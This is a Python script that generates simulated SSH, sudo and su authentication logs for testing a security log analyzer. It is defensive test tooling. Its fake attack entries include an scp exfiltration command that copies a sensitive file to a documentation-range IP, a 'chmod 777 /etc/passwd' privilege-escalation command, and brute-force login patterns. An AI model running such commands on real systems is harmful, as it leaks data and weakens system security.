#!/usr/bin/env python3
"""
Test Log Generator for Security Analysis

Generates simulated authentication log entries for testing the log analyzer.
Includes normal activity, security events, and attack patterns.

Author: Security Analyst
Version: 1.0
"""

import random
from datetime import datetime, timedelta
import argparse
import os

class LogGenerator:
    """
    Generate simulated authentication logs for testing
    """
    
    def __init__(self, output_file='simulated_auth.log'):
        """
        Initialize the log generator
        
        Args:
            output_file (str): Path to output file
        """
        self.output_file = output_file
        
        # Sample data (sanitized)
        self.users = ['alice', 'bob', 'charlie', 'dave', 'eve']
        self.commands = [
            'ls', 'pwd', 'cd /home', 'mkdir test', 
            'rm -rf /tmp/test', 'cat /etc/passwd', 
            'echo "Hello World"', 'chmod 755 /usr/local/bin',
            'cp file1 file2', 'mv file1 file2'
        ]
        self.su_commands = ['su - root', 'su - bob']
        self.sudo_commands = [
            'apt update', 'apt upgrade', 
            'systemctl restart apache2', 
            'adduser testuser', 'deluser testuser'
        ]
        self.attack_types = [
            'Failed password', 'Invalid user', 
            'PAM authentication failure', 'Hydra attack',
            'Data exfiltration', 'Privilege escalation'
        ]
    
    def random_datetime(self, start, end):
        """
        Generate random datetime within a range
        
        Args:
            start (datetime): Start of range
            end (datetime): End of range
            
        Returns:
            datetime: Random datetime in range
        """
        delta = end - start
        random_seconds = random.randint(0, int(delta.total_seconds()))
        return start + timedelta(seconds=random_seconds)
    
    def generate_auth_log_entries(self, total_entries, attack_start, attack_end):
        """
        Generate simulated auth.log entries
        
        Args:
            total_entries (int): Total number of entries to generate
            attack_start (datetime): Start of attack period
            attack_end (datetime): End of attack period
            
        Returns:
            list: Generated log entries
        """
        start_time = datetime(2024, 1, 1, 0, 0, 0)
        end_time = start_time + timedelta(days=120)
        
        auth_log_entries = []
        entries_per_phase = total_entries // 3
        
        phases = [
            ('pre-attack', start_time, attack_start),
            ('attack', attack_start, attack_end),
            ('post-attack', attack_end, end_time)
        ]
        
        for phase, phase_start, phase_end in phases:
            for _ in range(entries_per_phase):
                timestamp = self.random_datetime(phase_start, phase_end)
                log_time = timestamp.strftime('%b %d %H:%M:%S')
                host = "server"
                process = random.choice(['sshd', 'sudo', 'su'])
                pid = random.randint(1000, 5000)
                user = random.choice(self.users)
                
                if phase == 'attack':
                    activity_type = 'attack'
                else:
                    activity_type = random.choice([
                        'command', 'new_user', 'del_user', 
                        'passwd_change', 'su', 'sudo'
                    ])
                
                log_entry = self.generate_log_entry(
                    log_time, host, process, pid, user, activity_type
                )
                
                if log_entry:
                    if isinstance(log_entry, list):
                        auth_log_entries.extend(log_entry)
                    else:
                        auth_log_entries.append(log_entry)
        
        return auth_log_entries
    
    def generate_log_entry(self, log_time, host, process, pid, user, activity_type):
        """
        Generate a single log entry based on activity type
        
        Args:
            log_time (str): Timestamp for the log
            host (str): Hostname
            process (str): Process name
            pid (int): Process ID
            user (str): Username
            activity_type (str): Type of activity
            
        Returns:
            str or list: Generated log entry/entries
        """
        if activity_type == 'command':
            command = random.choice(self.commands)
            return f"{log_time} {host} {process}[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER={user} ; COMMAND={command}"
        
        elif activity_type == 'new_user':
            new_user = f"user{random.randint(100, 999)}"
            uid = random.randint(1000, 9999)
            return f"{log_time} {host} useradd[0]: new user: name={new_user}, uid={uid}, gid=100, home=/home/{new_user}, shell=/bin/bash"
        
        elif activity_type == 'del_user':
            deleted_user = f"user{random.randint(100, 999)}"
            return f"{log_time} {host} userdel[0]: delete user {deleted_user}"
        
        elif activity_type == 'passwd_change':
            return f"{log_time} {host} passwd[{pid}]: password for {user} changed by {user}"
        
        elif activity_type == 'su':
            su_command = random.choice(self.su_commands)
            return f"{log_time} {host} su[{pid}]: Successful su for {user} by root"
        
        elif activity_type == 'sudo':
            sudo_command = random.choice(self.sudo_commands)
            return f"{log_time} {host} sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={sudo_command}"
        
        elif activity_type == 'attack':
            return self.generate_attack_entry(log_time, host, pid, user)
        
        return None
    
    def generate_attack_entry(self, log_time, host, pid, user):
        """
        Generate attack-related log entries
        
        Args:
            log_time (str): Timestamp
            host (str): Hostname
            pid (int): Process ID
            user (str): Username
            
        Returns:
            str or list: Attack log entry/entries
        """
        attack_type = random.choice(self.attack_types)
        
        if attack_type == 'Failed password':
            # Generate sanitized IP (documentation range)
            ip = f"192.0.2.{random.randint(1, 254)}"
            port = random.randint(10000, 60000)
            invalid_user = random.choice(['invalid user', user])
            return f"{log_time} {host} sshd[{pid}]: Failed password for {invalid_user} from {ip} port {port} ssh2"
        
        elif attack_type == 'Invalid user':
            ip = f"198.51.100.{random.randint(1, 254)}"
            port = random.randint(10000, 60000)
            invalid_user = random.choice(['admin', 'guest', 'test'])
            return f"{log_time} {host} sshd[{pid}]: Invalid user {invalid_user} from {ip} port {port}"
        
        elif attack_type == 'PAM authentication failure':
            return f"{log_time} {host} sshd[{pid}]: PAM authentication failure for {user}"
        
        elif attack_type == 'Hydra attack':
            # Simulate multiple failed attempts followed by success
            entries = []
            attempts = random.randint(5, 15)
            ip = f"203.0.113.{random.randint(1, 254)}"
            
            for _ in range(attempts):
                port = random.randint(10000, 60000)
                attempt_user = random.choice(self.users + ['invalid_user'])
                entry = f"{log_time} {host} sshd[{pid}]: Failed password for {attempt_user} from {ip} port {port} ssh2"
                entries.append(entry)
            
            # Add successful login
            successful_user = random.choice(self.users)
            port = random.randint(10000, 60000)
            entry = f"{log_time} {host} sshd[{pid}]: Accepted password for {successful_user} from {ip} port {port} ssh2"
            entries.append(entry)
            
            return entries
        
        elif attack_type == 'Data exfiltration':
            ip = f"192.0.2.{random.randint(1, 254)}"
            return f"{log_time} {host} {random.choice(['sshd', 'sudo'])}[{pid}]: Detected data exfiltration attempt by {user} using command 'scp /data/sensitive_file {user}@{ip}:/remote/dir'"
        
        elif attack_type == 'Privilege escalation':
            return f"{log_time} {host} sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=chmod 777 /etc/passwd"
        
        return None
    
    def generate(self, total_entries=20000):
        """
        Generate and save log file
        
        Args:
            total_entries (int): Number of entries to generate
        """
        print(f"[+] Generating {total_entries} log entries...")
        
        # Define attack period
        attack_start = datetime(2024, 2, 15, 0, 0, 0)
        attack_end = datetime(2024, 3, 15, 0, 0, 0)
        
        # Generate logs
        simulated_logs = self.generate_auth_log_entries(
            total_entries, attack_start, attack_end
        )
        
        print(f"[+] Generated {len(simulated_logs)} total log entries")
        
        # Write to file
        print(f"[+] Writing logs to: {self.output_file}")
        try:
            with open(self.output_file, 'w') as f:
                for log in simulated_logs:
                    f.write(log + '\n')
            
            print(f"[+] Successfully wrote {len(simulated_logs)} entries to {self.output_file}")
            
            # Print sample
            print("\n[+] Sample of generated logs:")
            print("="*60)
            for log in simulated_logs[:5]:
                print(log)
            print("="*60)
            
        except Exception as e:
            print(f"[-] Error writing log file: {str(e)}")
            return False
        
        return True

def main():
    """
    Main entry point
    """
    parser = argparse.ArgumentParser(
        description='Generate simulated authentication logs for testing'
    )
    
    parser.add_argument('-o', '--output',
                       default='simulated_auth.log',
                       help='Output file path (default: simulated_auth.log)')
    parser.add_argument('-n', '--entries',
                       type=int,
                       default=20000,
                       help='Number of log entries to generate (default: 20000)')
    
    args = parser.parse_args()
    
    # Create generator
    generator = LogGenerator(args.output)
    
    # Generate logs
    success = generator.generate(args.entries)
    
    return 0 if success else 1

if __name__ == "__main__":
    exit(main())